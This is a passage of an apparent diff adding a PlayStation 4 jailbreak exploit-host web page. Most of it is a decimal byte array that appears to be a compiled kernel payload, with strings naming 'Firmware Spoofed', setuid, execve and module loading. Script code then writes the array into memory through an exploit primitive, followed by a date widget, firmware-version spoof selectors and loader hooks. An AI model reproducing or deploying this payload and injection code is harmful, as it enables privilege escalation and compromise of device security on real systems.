3,10,6,0,0,233,145,251,255,255,72,49,192,73,137,202,15,5,114,1,195,72,131,61,197,8,0,0,0,116,24,80,255,21,188,8,0,0,89,137,8,72,199,192,255,255,255,255,72,199,194,255,255,255,255,195,70,105,114,109,119,97,114,101,32,83,112,111,111,102,101,100,32,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,85,116,105,108,46,115,112,114,120,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,83,121,115,85,116,105,108,83,101,110,100,83,121,115,116,101,109,78,111,116,105,102,105,99,97,116,105,111,110,87,105,116,104,84,101,120,116,0,115,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,76,97,117,110,99,104,87,101,98,66,114,111,119,115,101,114,0,37,115,10,10,10,10,10,10,10,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,85,115,101,114,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,73,110,105,116,105,97,108,105,122,101,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,71,101,116,76,111,103,105,110,85,115,101,114,73,100,76,105,115,116,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,84,101,114,109,105,110,97,116,101,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,71,101,116,85,115,101,114,78,97,109,101,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,71,101,116,73,110,105,116,105,97,108,85,115,101,114,0,83,99,101,83,121,115,67,111,114,101,82,101,98,111,111,116,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,107,101,114,110,101,108,46,115,112,114,120,0,115,99,101,75,101,114,110,101,108,82,101,98,111,111,116,0,108,105,98,83,99,101,76,105,98,99,73,110,116,101,114,110,97,108,46,115,112,114,120,0,109,97,108,108,111,99,0,102,114,101,101,0,99,97,108,108,111,99,0,114,101,97,108,108,111,99,0,109,101,109,97,108,105,103,110,0,109,101,109,115,101,116,0,109,101,109,99,112,121,0,109,101,109,99,109,112,0,115,116,114,99,112,121,0,115,116,114,110,99,112,121,0,115,116,114,99,97,116,0,115,116,114,110,99,97,116,0,115,116,114,108,101,110,0,115,116,114,99,109,112,0,115,116,114,110,99,109,112,0,115,112,114,105,110,116,102,0,115,110,112,114,105,110,116,102,0,115,115,99,97,110,102,0,115,116,114,99,104,114,0,115,116,114,114,99,104,114,0,115,116,114,115,116,114,0,115,116,114,100,117,112,0,114,105,110,100,101,120,0,105,115,100,105,103,105,116,0,97,116,111,105,0,115,116,114,108,99,112,121,0,115,116,114,101,114,114,111,114,0,95,71,101,116,112,99,116,121,112,101,0,95,83,116,111,117,108,0,98,99,111,112,121,0,115,114,97,110,100,0,97,115,99,116,105,109,101,0,97,115,99,116,105,109,101,95,114,0,103,109,116,105,109,101,0,103,109,116,105,109,101,95,115,0,108,111,99,97,108,116,105,109,101,0,108,111,99,97,108,116,105,109,101,95,114,0,109,107,116,105,109,101,0,111,112,101,110,100,105,114,0,114,101,97,100,100,105,114,0,114,101,97,100,100,105,114,95,114,0,116,101,108,108,100,105,114,0,115,101,101,107,100,105,114,0,114,101,119,105,110,100,100,105,114,0,99,108,111,115,101,100,105,114,0,100,105,114,102,100,0,103,101,116,112,114,111,103,110,97,109,101,0,102,111,112,101,110,0,102,114,101,97,100,0,102,119,114,105,116,101,0,102,115,101,101,107,0,102,116,101,108,108,0,102,99,108,111,115,101,0,102,112,114,105,110,116,102,0,108,105,98,83,99,101,83,121,115,109,111,100,117,108,101,46,115,112,114,120,0,115,99,101,83,121,115,109,111,100,117,108,101,76,111,97,100,77,111,100,117,108,101,0,108,105,98,107,101,114,110,101,108,95,119,101,98,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,115,121,115,46,115,112,114,120,0,95,95,115,116,97,99,107,95,99,104,107,95,103,117,97,114,100,0,95,95,115,116,97,99,107,95,99,104,107,95,102,97,105,108,0,95,95,101,114,114,111,114,0,115,99,101,75,101,114,110,101,108,69,114,114,111,114,0,115,99,101,75,101,114,110,101,108,76,111,97,100,83,116,97,114,116,77,111,100,117,108,101,0,115,99,101,75,101,114,110,101,108,65,108,108,111,99,97,116,101,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,77,97,112,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,71,101,116,68,105,114,101,99,116,77,101,109,111,114,121,83,105,122,101,0,115,99,101,75,101,114,110,101,108,83,116,97,116,0,115,99,101,75,101,114,110,101,108,79,112,101,110,0,115,99,101,75,101,114,110,101,108,82,101,97,100,0,115,99,101,75,101,114,110,101,108,76,115,101,101,107,0,115,99,101,75,101,114,110,101,108,67,108,111,115,101,0,115,99,101,75,101,114,110,101,108,83,108,101,101,112,0,115,99,101,75,101,114,110,101,108,85,115,108,101,101,112,0,115,99,101,75,101,114,110,101,108,71,101,116,116,105,109,101,111,102,100,97,121,0,115,99,101,75,101,114,110,101,108,71,101,116,80,114,111,99,101,115,115,84,105,109,101,0,115,99,101,75,101,114,110,101,108,71,101,116,67,117,114,114,101,110,116,67,112,117,0,115,121,115,99,116,108,0,115,121,115,99,116,108,98,121,110,97,109,101,0,115,121,115,97,114,99,104,0,101,120,101,99,118,101,0,112,116,104,114,101,97,100,95,115,101,108,102,0,112,116,104,114,101,97,100,95,115,101,116,97,102,102,105,110,105,116,121,95,110,112,0,115,99,101,75,101,114,110,101,108,67,114,101,97,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,68,101,108,101,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,65,100,100,85,115,101,114,69,118,101,110,116,0,115,99,101,75,101,114,110,101,108,65,100,100,82,101,97,100,69,118,101,110,116,0,103,101,116,117,105,100,0,103,101,116,103,105,100,0,103,101,116,112,105,100,0,115,101,116,117,105,100,0,115,101,116,103,105,100,0,115,101,116,114,101,117,105,100,0,115,101,116,114,101,103,105,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
+window.mira_blob_2_len = 5144;
+window.mira_blob_2 = malloc(window.mira_blob_2_len);
+write_mem(window.mira_blob_2, payload);}
+</script>
+ <script type="text/javascript">
+  function showdate() {
+  week= new Array("يكشنبه","دوشنبه","سه شنبه","چهارشنبه","پنج شنبه","جمعه","شنبه");
+  months = new Array("1","2","3","4","5","6","7","8","9","10","11","12");
+  a = new Date();
+  d= a.getDay();
+  Hour= a.getHours();
+  Minute= a.getMinutes();
+  Second= a.getSeconds();
+  if(Minute<10){
+  Minute="0"+Minute;
+  }
+  if(Second<10){
+  Second="0"+Second;
+  }
+  if(Hour<10){
+  Hour="0"+Hour;
+  }
+  day= a.getDate();
+  month = a.getMonth()+1;
+  year= a.getYear()-100;
+  year = (year== 0)?2000:year;
+  (year<1000)? (year += 2000):true;
+  year -= ( (month < 3) || ((month == 3) && (day < 21)) )? 622:621;
+  switch (month) {
+  case 1: (day<21)? (month=10, day+=10):(month=11, day-=20); break;
+  case 2: (day<20)? (month=11, day+=11):(month=12, day-=19); break;
+  case 3: (day<21)? (month=12, day+=9):(month=1, day-=20);
+  break;
+  case 4: (day<21)? (month=1, day+=11):(month=2, day-=20);
+  break;
+  case 5:
+  case 6: (day<22)? (month-=3, day+=10):(month-=2, day-=21); break;
+  case 7:
+  case 8:
+  case 9: (day<23)? (month-=3, day+=9):(month-=2, day-=22);
+  break;
+  case 10:(day<23)? (month=7, day+=8):(month=8, day-=22);
+  break;
+  case 11:
+  case 12:(day<22)? (month-=3, day+=9):(month-=2, day-=21);
+  break;
+  default:
+  break;
+  }
+  
+  function gregorian_to_jalali(gy,gm,gd){
+  var g_d_m,jy,jm,jd,gy2,days;
+  g_d_m=[0,31,59,90,120,151,181,212,243,273,304,334];
+  if(gy > 1600){
+  jy=979;
+  gy-=1600;
+  }else{
+  jy=0;
+  gy-=621;
+  }
+  gy2=(gm > 2)?(gy+1):gy;
+  days=(365*gy) +(parseInt((gy2+3)/4)) -(parseInt((gy2+99)/100)) +(parseInt((gy2+399)/400)) -80 +gd +g_d_m[gm-1];
+  jy+=33*(parseInt(days/12053)); 
+  days%=12053;
+  jy+=4*(parseInt(days/1461));
+  days%=1461;
+  if(days > 365){
+  jy+=parseInt((days-1)/365);
+  days=(days-1)%365;
+  }
+  jm=(days < 186)?1+parseInt(days/31):7+parseInt((days-186)/30);
+  jd=1+((days < 186)?(days%31):((days-186)%30));
+  return [jy,jm,jd];
+  }
+  
+  ndt=new Date();
+  g_y=ndt.getFullYear();
+  g_m=ndt.getMonth()+1;
+  g_d=ndt.getDate();
+  shamsi=gregorian_to_jalali(g_y,g_m,g_d);
+  var nday = shamsi[2];
+  document.getElementById("date").innerHTML=(year+"/"+months[month-1]+"/"+nday);
+  document.getElementById("clock").innerHTML=(Hour+":"+Minute);
+  if(app.retLang()=="eng" || app.retLang()=="esp"){//for English
+   mDay=a.getDate();
+   mMonth=a.getMonth()+1;
+   mYear=a.getFullYear();
+   if(mDay<10){
+    mDay="0"+mDay;
+   }
+   if(mMonth<10){
+    mMonth="0"+mMonth;
+   }
+   document.getElementById("date").innerHTML=(mYear+"/"+mMonth+"/"+mDay);
+   msgs.style.marginLeft="80px"
+  }
+
+  }
+  
+  setInterval(showdate,10000);
+  showdate()
+ </script>
+ <select style='font-size:20px;text-align:center;color:white' id="fws1"></select><select style='font-size:20px;text-align:center;color:white' id="fws2"></select>
+ <script>
+for(var i=1; i<=99; i++){var select1 = document.getElementById("fws1"); var option1 = document.createElement("OPTION"); select1.options.add(option1); option1.text = i; option1.value = i;}
+fws1.value=9;
+for(var i=00; i<=99; i++){var select2 = document.getElementById("fws2"); var option2 = document.createElement("OPTION"); select2.options.add(option2); option2.text = ("0" + i).slice(-2); option2.value = i;}
+fws2.value=99;
+</script>
+ <script>
+parent.ldbar = ldbar;
+parent.txt0 = txt0;
+parent.loaderp = loaderp;
+parent.done = done;
+parent.ldbarx = ldbarx;
+parent.txt1 = txt1;
+parent.loaderx = loaderx;
+parent.donex = donex;
+parent.failx = failx;
+parent.ldbarm = ldbarm;
+parent.txtm = txtm;
+parent.loaderm = loaderm;
+parent.donem = donem;
+parent.failm = failm;
+</script>
+</body>
+</html>
